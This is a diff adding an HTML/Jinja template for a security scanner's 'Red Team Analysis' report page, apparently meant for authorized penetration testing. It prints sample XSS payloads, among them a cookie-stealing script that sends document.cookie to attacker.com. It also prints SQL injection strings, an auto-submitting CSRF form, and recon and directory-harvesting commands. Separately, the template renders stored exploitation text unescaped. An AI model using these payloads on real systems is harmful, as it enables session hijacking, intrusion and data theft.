@@ -1,0 +1,492 @@
+{% extends "layout.html" %}
+
+{% block title %}Red Team Analysis{% endblock %}
+
+{% block content %}
+<div class="mb-4">
+    <div class="d-flex justify-content-between align-items-center">
+        <h1>
+            <i class="fas fa-user-secret text-danger me-2"></i>Red Team Analysis
+        </h1>
+        <div class="btn-group">
+            <a href="{{ url_for('view_scan', scan_id=scan.id) }}" class="btn btn-outline-secondary">
+                <i class="fas fa-file-alt me-1"></i> Standard Report
+            </a>
+            <a href="{{ url_for('blue_team', scan_id=scan.id) }}" class="btn btn-outline-primary">
+                <i class="fas fa-shield-alt me-1"></i> Blue Team View
+            </a>
+            <div class="btn-group">
+                <button type="button" class="btn btn-outline-danger dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">
+                    <i class="fas fa-download me-1"></i> Export
+                </button>
+                <ul class="dropdown-menu">
+                    <li><a class="dropdown-item" href="{{ url_for('export_report', scan_id=scan.id, format='pdf') }}">Export as PDF</a></li>
+                    <li><a class="dropdown-item" href="{{ url_for('export_report', scan_id=scan.id, format='csv') }}">Export as CSV</a></li>
+                </ul>
+            </div>
+            <a href="{{ url_for('dashboard') }}" class="btn btn-outline-secondary">
+                <i class="fas fa-arrow-left me-1"></i> Back to Dashboard
+            </a>
+        </div>
+    </div>
+</div>
+
+<!-- Red Team Introduction -->
+<div class="card mb-4 border-0 shadow-sm">
+    <div class="card-header bg-danger text-white">
+        <h4 class="mb-0">Offensive Security Assessment</h4>
+    </div>
+    <div class="card-body">
+        <p>
+            This report provides an offensive security assessment for <strong>{{ scan.target }}</strong>. 
+            It details potential attack vectors, exploitation techniques, and penetration testing guidance
+            based on discovered vulnerabilities.
+        </p>
+        <div class="alert alert-danger">
+            <i class="fas fa-exclamation-triangle me-2"></i> <strong>Important:</strong> 
+            This information is provided for educational and authorized security testing purposes only. 
+            Unauthorized exploitation of vulnerabilities may be illegal.
+        </div>
+    </div>
+</div>
+
+<!-- Attack Surface Summary -->
+<div class="card mb-4 border-0 shadow-sm">
+    <div class="card-header bg-transparent">
+        <h4 class="mb-0">Attack Surface Summary</h4>
+    </div>
+    <div class="card-body">
+        {% if results %}
+        <div class="row">
+            <div class="col-md-6">
+                <canvas id="exploitabilityChart" height="250"></canvas>
+            </div>
+            <div class="col-md-6">
+                <h5>Vulnerability Categories</h5>
+                
+                {% set injection_vulns = results|selectattr('vulnerability_type', 'search', 'xss|injection|sql')|list|length %}
+                {% set config_vulns = results|selectattr('vulnerability_type', 'search', 'missing_|config|header')|list|length %}
+                {% set auth_vulns = results|selectattr('vulnerability_type', 'search', 'auth|csrf|login')|list|length %}
+                {% set info_vulns = results|selectattr('vulnerability_type', 'search', 'disclosure|exposure|info')|list|length %}
+                
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between mb-1">
+                        <span>Injection Vulnerabilities</span>
+                        <span>{{ injection_vulns }}</span>
+                    </div>
+                    <div class="progress">
+                        <div class="progress-bar bg-danger" role="progressbar" style="width: {{ injection_vulns * 20 if injection_vulns <= 5 else 100 }}%"></div>
+                    </div>
+                </div>
+                
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between mb-1">
+                        <span>Configuration Issues</span>
+                        <span>{{ config_vulns }}</span>
+                    </div>
+                    <div class="progress">
+                        <div class="progress-bar bg-warning" role="progressbar" style="width: {{ config_vulns * 10 if config_vulns <= 10 else 100 }}%"></div>
+                    </div>
+                </div>
+                
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between mb-1">
+                        <span>Authentication Weaknesses</span>
+                        <span>{{ auth_vulns }}</span>
+                    </div>
+                    <div class="progress">
+                        <div class="progress-bar bg-info" role="progressbar" style="width: {{ auth_vulns * 25 if auth_vulns <= 4 else 100 }}%"></div>
+                    </div>
+                </div>
+                
+                <div class="mb-3">
+                    <div class="d-flex justify-content-between mb-1">
+                        <span>Information Disclosure</span>
+                        <span>{{ info_vulns }}</span>
+                    </div>
+                    <div class="progress">
+                        <div class="progress-bar bg-success" role="progressbar" style="width: {{ info_vulns * 12 if info_vulns <= 8 else 100 }}%"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        {% else %}
+        <div class="alert alert-info">
+            <i class="fas fa-info-circle me-2"></i>No vulnerabilities were detected in this scan.
+        </div>
+        {% endif %}
+    </div>
+</div>
+
+<!-- Potential Attack Vectors -->
+{% if results %}
+<div class="card mb-4 border-0 shadow-sm">
+    <div class="card-header bg-transparent">
+        <h4 class="mb-0">Potential Attack Vectors</h4>
+    </div>
+    <div class="card-body">
+        <div class="table-responsive">
+            <table class="table table-hover">
+                <thead>
+                    <tr>
+                        <th>Vulnerability</th>
+                        <th>Severity</th>
+                        <th>Exploitability</th>
+                        <th>Potential Impact</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    {% set exploitability = {
+                        'potential_xss': 'High', 
+                        'potential_sqli': 'High', 
+                        'csrf_vulnerability': 'Medium', 
+                        'directory_listing': 'Medium',
+                        'sensitive_file_exposure': 'High',
+                        'missing_csrf_token': 'Medium',
+                        'server_info_disclosure': 'Low',
+                        'insecure_http': 'Medium',
+                        'open_port_21': 'Medium',
+                        'open_port_22': 'Low',
+                        'open_port_23': 'High',
+                        'open_port_3389': 'Medium',
+                        'vulnerable_service': 'High',
+                        'expired_ssl_cert': 'Low',
+                        'self_signed_cert': 'Medium'
+                    } %}
+                    
+                    {% set impact = {
+                        'potential_xss': 'Session hijacking, data theft, client-side malware',
+                        'potential_sqli': 'Data breach, authentication bypass, system compromise',
+                        'csrf_vulnerability': 'Forced actions, account takeover',
+                        'directory_listing': 'Information disclosure, sensitive file access',
+                        'sensitive_file_exposure': 'Configuration disclosure, credential theft',
+                        'missing_csrf_token': 'Forced actions on behalf of users',
+                        'server_info_disclosure': 'Targeting specific vulnerabilities',
+                        'insecure_http': 'Credential theft, session hijacking',
+                        'open_port_21': 'Brute force, unauthorized access',
+                        'open_port_22': 'SSH brute force',
+                        'open_port_23': 'Plaintext credential capture',
+                        'open_port_3389': 'Remote access exploitation',
+                        'vulnerable_service': 'Service-specific exploitation',
+                        'expired_ssl_cert': 'Man-in-the-middle attacks',
+                        'self_signed_cert': 'Man-in-the-middle attacks'
+                    } %}
+                    
+                    {% for result in results|sort(attribute='severity', reverse=true) %}
+                    <tr>
+                        <td>{{ result.vulnerability_type.replace('_', ' ').title() }}</td>
+                        <td>
+                            {% if result.severity == 'critical' %}
+                            <span class="badge bg-danger">Critical</span>
+                            {% elif result.severity == 'high' %}
+                            <span class="badge bg-warning text-dark">High</span>
+                            {% elif result.severity == 'medium' %}
+                            <span class="badge bg-info">Medium</span>
+                            {% else %}
+                            <span class="badge bg-success">Low</span>
+                            {% endif %}
+                        </td>
+                        <td>
+                            {% if exploitability[result.vulnerability_type] == 'High' %}
+                            <span class="badge bg-danger">High</span>
+                            {% elif exploitability[result.vulnerability_type] == 'Medium' %}
+                            <span class="badge bg-warning text-dark">Medium</span>
+                            {% else %}
+                            <span class="badge bg-success">Low</span>
+                            {% endif %}
+                        </td>
+                        <td>{{ impact.get(result.vulnerability_type, 'Potential system compromise') }}</td>
+                        <td>
+                            <a href="#vuln-{{ result.id }}" class="btn btn-sm btn-outline-danger">
+                                View Details
+                            </a>
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
+        </div>
+    </div>
+</div>
+{% endif %}
+
+<!-- Detailed Exploitation Guides -->
+<div class="card mb-4 border-0 shadow-sm">
+    <div class="card-header bg-transparent">
+        <h4 class="mb-0">Exploitation Techniques</h4>
+    </div>
+    <div class="card-body p-0">
+        {% if results %}
+        <div class="list-group list-group-flush">
+            {% for result in results|sort(attribute='severity', reverse=true) %}
+            <div class="list-group-item p-4" id="vuln-{{ result.id }}">
+                <div class="d-flex justify-content-between align-items-center mb-3">
+                    <h5 class="mb-0">
+                        {% if result.severity == 'critical' %}
+                        <span class="badge bg-danger me-2">Critical</span>
+                        {% elif result.severity == 'high' %}
+                        <span class="badge bg-warning text-dark me-2">High</span>
+                        {% elif result.severity == 'medium' %}
+                        <span class="badge bg-info me-2">Medium</span>
+                        {% else %}
+                        <span class="badge bg-success me-2">Low</span>
+                        {% endif %}
+                        {{ result.vulnerability_type.replace('_', ' ').title() }}
+                    </h5>
+                </div>
+                
+                <div class="mb-3">
+                    <strong>Description:</strong>
+                    <p>{{ result.description }}</p>
+                </div>
+                
+                <div class="mb-3">
+                    <strong>Vulnerability Details:</strong>
+                    <pre class="bg-dark text-white p-3 rounded">{{ result.details }}</pre>
+                </div>
+                
+                <div class="card mb-3 border-danger">
+                    <div class="card-header bg-danger text-white">
+                        <h5 class="mb-0"><i class="fas fa-bug me-2"></i>Exploitation Techniques</h5>
+                    </div>
+                    <div class="card-body">
+                        <div class="exploitation-content">
+                            {{ result.exploitation|safe|replace('\n', '<br>') }}
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Practical Examples -->
+                <div class="card">
+                    <div class="card-header bg-dark text-white">
+                        <h5 class="mb-0"><i class="fas fa-terminal me-2"></i>Practical Examples</h5>
+                    </div>
+                    <div class="card-body">
+                        {% if result.vulnerability_type == 'potential_xss' %}
+                        <div class="mb-3">
+                            <h6>Basic XSS Payloads</h6>
+                            <pre class="bg-dark text-white p-2 rounded"># Basic testing payload
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+
+# Event handler payload (for bypass)
+&lt;img src="x" onerror="alert('XSS')"&gt;
+
+# JavaScript URL payload
+&lt;a href="javascript:alert('XSS')"&gt;Click me&lt;/a&gt;</pre>
+                        </div>
+                        <div class="mb-3">
+                            <h6>Cookie Stealing Payload</h6>
+                            <pre class="bg-dark text-white p-2 rounded">&lt;script&gt;
+fetch('https://attacker.com/steal?cookie='+document.cookie)
+&lt;/script&gt;</pre>
+                        </div>
+                        {% elif result.vulnerability_type == 'potential_sqli' %}
+                        <div class="mb-3">
+                            <h6>SQL Injection Testing Payloads</h6>
+                            <pre class="bg-dark text-white p-2 rounded"># Basic SQLi test
+' OR 1=1 --
+
+# Authentication bypass
+admin' --
+
+# Union-based SQLi (adjust column count as needed)
+' UNION SELECT 1,2,3,database(),user(),version() --
+
+# Time-based blind SQLi
+' OR (SELECT SLEEP(5)) --</pre>
+                        </div>
+                        {% elif result.vulnerability_type == 'csrf_vulnerability' %}
+                        <div class="mb-3">
+                            <h6>CSRF Attack Template</h6>
+                            <pre class="bg-dark text-white p-2 rounded">&lt;html&gt;
+  &lt;body onload="document.csrf_form.submit()"&gt;
+    &lt;form name="csrf_form" action="https://{{ scan.target }}/some-action" method="POST"&gt;
+      &lt;input type="hidden" name="param1" value="malicious_value"&gt;
+      &lt;!-- Add other parameters as needed --&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;</pre>
+                        </div>
+                        {% elif 'open_port' in result.vulnerability_type %}
+                        <div class="mb-3">
+                            <h6>Port Scanning & Service Enumeration</h6>
+                            <pre class="bg-dark text-white p-2 rounded"># Nmap scan for detailed service information
+nmap -sV -p {{ result.vulnerability_type.split('_')[-1] }} {{ scan.target }}
+
+# Banner grabbing
+nc -v {{ scan.target }} {{ result.vulnerability_type.split('_')[-1] }}
+
+# For HTTP/HTTPS service detection
+curl -I http://{{ scan.target }}:{{ result.vulnerability_type.split('_')[-1] }}</pre>
+                        </div>
+                        {% elif result.vulnerability_type == 'server_info_disclosure' %}
+                        <div class="mb-3">
+                            <h6>Gathering Server Information</h6>
+                            <pre class="bg-dark text-white p-2 rounded"># Check server headers
+curl -I {{ scan.target }}
+
+# Use Whatweb for fingerprinting
+whatweb {{ scan.target }}
+
+# Search for known vulnerabilities based on version information
+searchsploit [server_name] [version]</pre>
+                        </div>
+                        {% elif result.vulnerability_type == 'directory_listing' %}
+                        <div class="mb-3">
+                            <h6>Exploiting Directory Listing</h6>
+                            <pre class="bg-dark text-white p-2 rounded"># Download all files in an exposed directory
+wget -r -np http://{{ scan.target }}/exposed-directory/
+
+# Look for sensitive files
+grep -r "password\|key\|secret\|credential" downloaded-directory/</pre>
+                        </div>
+                        {% else %}
+                        <p>For practical exploitation examples specific to this vulnerability, refer to the detailed exploitation techniques above.</p>
+                        {% endif %}
+                        
+                        <div class="alert alert-warning mt-3">
+                            <i class="fas fa-exclamation-triangle me-2"></i>
+                            <strong>Reminder:</strong> Always obtain proper authorization before attempting any exploitation techniques against a target system.
+                        </div>
+                    </div>
+                </div>
+            </div>
+            {% endfor %}
+        </div>
+        {% else %}
+        <div class="alert alert-info m-3">
+            <i class="fas fa-info-circle me-2"></i>No vulnerabilities were detected in this scan.
+        </div>
+        {% endif %}
+    </div>
+</div>
+
+<!-- Penetration Testing Methodology -->
+<div class="card mb-4 border-0 shadow-sm">
+    <div class="card-header bg-transparent">
+        <h4 class="mb-0">Penetration Testing Methodology</h4>
+    </div>
+    <div class="card-body">
+        <div class="row">
+            <div class="col-md-6">
+                <div class="card h-100">
+                    <div class="card-header bg-secondary text-white">
+                        <h5 class="mb-0">Reconnaissance</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Gather domain information with <code>whois</code> and <code>dig</code></li>
+                            <li>Enumerate subdomains with tools like <code>sublist3r</code></li>
+                            <li>Port scan with <code>nmap</code> to identify services</li>
+                            <li>Service fingerprinting to determine versions</li>
+                            <li>Directory and file discovery with <code>gobuster</code> or <code>dirbuster</code></li>
+                            <li>Technology stack identification with <code>wappalyzer</code> or <code>whatweb</code></li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card h-100">
+                    <div class="card-header bg-secondary text-white">
+                        <h5 class="mb-0">Exploitation</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Target specific vulnerabilities identified in the scan</li>
+                            <li>Test for injection vulnerabilities (SQL, XSS, Command)</li>
+                            <li>Attempt authentication bypass techniques</li>
+                            <li>Exploit misconfigured services</li>
+                            <li>Test for CSRF, SSRF, and other web vulnerabilities</li>
+                            <li>Exploit outdated software with known CVEs</li>
+                            <li>Document all findings and maintain chain of evidence</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="row mt-4">
+            <div class="col-md-6">
+                <div class="card h-100">
+                    <div class="card-header bg-secondary text-white">
+                        <h5 class="mb-0">Post-Exploitation</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Maintain access (if authorized)</li>
+                            <li>Privilege escalation attempts</li>
+                            <li>Data collection and exfiltration testing</li>
+                            <li>Lateral movement within the network</li>
+                            <li>Cleanup and removal of artifacts</li>
+                            <li>Documentation of access paths and findings</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6">
+                <div class="card h-100">
+                    <div class="card-header bg-secondary text-white">
+                        <h5 class="mb-0">Reporting</h5>
+                    </div>
+                    <div class="card-body">
+                        <ol>
+                            <li>Document methodology and tools used</li>
+                            <li>Provide detailed vulnerability descriptions</li>
+                            <li>Include proof of concept for vulnerabilities</li>
+                            <li>Document impact of each vulnerability</li>
+                            <li>Provide recommendations for remediation</li>
+                            <li>Include executive summary for management</li>
+                            <li>Present findings to technical and non-technical stakeholders</li>
+                        </ol>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+{% endblock %}
+
+{% block scripts %}
+<script src="{{ url_for('static', filename='js/chart-config.js') }}"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Define vulnerability counts by severity for exploitability chart
+        {% set critical_count = results|selectattr('severity', 'equalto', 'critical')|list|length %}
+        {% set high_count = results|selectattr('severity', 'equalto', 'high')|list|length %}
+        {% set medium_count = results|selectattr('severity', 'equalto', 'medium')|list|length %}
+        {% set low_count = results|selectattr('severity', 'equalto', 'low')|list|length %}
+        
+        // Calculate exploitability levels based on severity and vulnerability type
+        {% set easy_to_exploit = 0 %}
+        {% set moderate_to_exploit = 0 %}
+        {% set difficult_to_exploit = 0 %}
+        
+        {% for result in results %}
+            {% if result.vulnerability_type in ['potential_xss', 'potential_sqli', 'directory_listing', 'sensitive_file_exposure', 'open_port_23'] 
+                or result.severity == 'critical' %}
+                {% set easy_to_exploit = easy_to_exploit + 1 %}
+            {% elif result.severity == 'high' or result.vulnerability_type in ['csrf_vulnerability', 'insecure_http', 'missing_csrf_token', 'open_port_21', 'open_port_3389', 'self_signed_cert'] %}
+                {% set moderate_to_exploit = moderate_to_exploit + 1 %}
+            {% else %}
+                {% set difficult_to_exploit = difficult_to_exploit + 1 %}
+            {% endif %}
+        {% endfor %}
+        
+        // Exploitability chart data
+        const exploitabilityData = {
+            labels: ['Easy to Exploit', 'Moderate Difficulty', 'Difficult to Exploit'],
+            datasets: [{
+                data: [{{ easy_to_exploit }}, {{ moderate_to_exploit }}, {{ difficult_to_exploit }}],
+                backgroundColor: ['#dc3545', '#fd7e14', '#20c997']
+            }]
+        };
+        
+        // Create the exploitability chart
+        if (document.getElementById('exploitabilityChart')) {
+            createDoughnutChart('exploitabilityChart', exploitabilityData);
+        }
+    });
+</script>
+{% endblock %}
